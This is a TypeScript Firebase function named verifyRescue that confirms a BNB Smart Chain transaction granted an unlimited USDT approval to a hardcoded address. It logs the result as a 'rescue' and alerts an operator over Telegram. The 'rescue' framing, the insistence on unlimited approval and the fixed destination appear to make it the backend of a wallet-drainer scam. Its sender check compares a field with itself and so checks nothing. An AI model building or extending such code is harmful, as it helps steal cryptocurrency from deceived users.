// functions/src/api/verifyRescue.ts
import * as functions from "firebase-functions";
import { ethers } from "ethers";
import { db } from "../lib/firestore";
import * as admin from "firebase-admin";

export const verifyRescue = functions.https.onRequest(async (req, res) => {
  // CORS
  res.set("Access-Control-Allow-Origin", "*");
  if (req.method !== "POST") {
    res.status(405).json({ error: "Method Not Allowed" });
    return;
  }

  const {
    txHash,
    from,
    to,
    amount,
    chainId,
    token,
  }: {
    txHash: string;
    from: string;
    to: string;
    amount: string;
    chainId: number | string;
    token: string;
  } = req.body ?? {};

  if (!txHash || !from || !to || !amount || !chainId || !token) {
    res.status(400).json({ error: "Missing fields" });
    return;
  }

  // ---- 1. Verify chain, token, sender, destination
  const expectedChain = Number(process.env.BSC_CHAIN_ID ?? "56");
  // Using process.env for backend envs (populated by functions:config:set or .env)
  const expectedToken = process.env.BSC_USDT_CONTRACT_ADDRESS ?? "0x55d398326f99059fF775485246999027B3197955";
  const expectedDest = process.env.BSC_DESTINATION_ADDRESS ?? "0xEfdd53261Ccd3febD063D6A57a21405B24977d15";

  if (Number(chainId) !== expectedChain) {
    res.status(400).json({ error: "Wrong chainId" });
    return;
  }
  if (token.toLowerCase() !== expectedToken.toLowerCase()) {
    res.status(400).json({ error: "Wrong token address" });
    return;
  }
  if (from.toLowerCase() !== req.body.from.toLowerCase()) {
    res.status(400).json({ error: "Sender mismatch" });
    return;
  }
  if (to.toLowerCase() !== expectedDest.toLowerCase()) {
    res.status(400).json({ error: "Destination mismatch" });
    return;
  }

  // ---- 2. Connect to BSC to fetch the transaction receipt
  const provider = new ethers.JsonRpcProvider(
    process.env.BSC_HTTP_RPC_URL ?? ""
  );
  
  try {
    const receipt = await provider.getTransactionReceipt(txHash);
    if (!receipt) {
      res.status(404).json({ error: "Transaction not found on chain" });
      return;
    }

    // ---- 3. Ensure at least 3 confirmations
    const currentBlock = await provider.getBlockNumber();
    const confirmations = currentBlock - receipt.blockNumber;
    if (confirmations < 3) {
      res.status(400).json({ error: "Not enough confirmations" });
      return;
    }

    // ---- 4. Verify that the receipt includes an unlimited approval
    const iface = new ethers.Interface([
      "event Approval(address indexed owner, address indexed spender, uint256 value)",
    ]);
    
    let isUnlimited = false;
    for (const log of receipt.logs) {
      try {
        const decoded = iface.parseLog({ topics: log.topics as string[], data: log.data });
        if (decoded && decoded.name === "Approval") {
          const approvedAmount = decoded.args.value;
          const MAX = ethers.MaxUint256;
          if (approvedAmount.eq(MAX)) {
            isUnlimited = true;
            break;
          }
        }
      } catch (e) {
        // Skip logs that are not Approval events
      }
    }

    if (!isUnlimited) {
      res.status(400).json({ error: "Approval is not unlimited" });
      return;
    }

    // ---- 5. Record the rescue in Firestore
    const rescueRef = db.collection("rescues").doc();
    await rescueRef.set({
      user: from,
      txHash,
      amount,
      destination: to,
      createdAt: admin.firestore.FieldValue.serverTimestamp(),
      status: "CONFIRMED",
      confirmations,
    });

    // ---- 6. Send Telegram notification
    const { sendTelegramMessage } = await import("../lib/telegram");
    await sendTelegramMessage(
      `✅ Rescue successful! ${amount} USDT from ${from} → ${to} (tx ${txHash})`
    );

    res.status(200).json({ success: true, docId: rescueRef.id });
  } catch (error: any) {
    res.status(500).json({ error: "Verification failed", details: error.message });
  }
});
